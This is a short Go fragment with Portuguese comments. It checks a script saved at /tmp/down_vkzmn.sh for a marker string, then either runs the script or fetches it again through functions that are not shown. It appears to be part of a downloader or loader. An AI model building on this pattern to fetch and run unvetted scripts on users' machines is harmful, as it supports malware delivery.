package main





import (


"os"
"fmt"
"io/ioutil"
"strings"

)






func  magic() {


//check magic byte in down_vkzmn.sh
ptr ,  err_open := os.Open("/tmp/down_vkzmn.sh")

my_str  :=   "#ATILA_VKZMN"

  if err_open == nil {

  down_bytes , err_readall :=   ioutil.ReadAll(ptr)

               if  err_readall == nil {

               down_str := string(down_bytes)

                   if (strings.Contains(down_str  ,  my_str ) ) {

                          //script valido

                            exec_vkzmn()


                      }  else { fmt.Println("script invalido") 

                             down_vkzmn() 




                             }



 } 

}

}

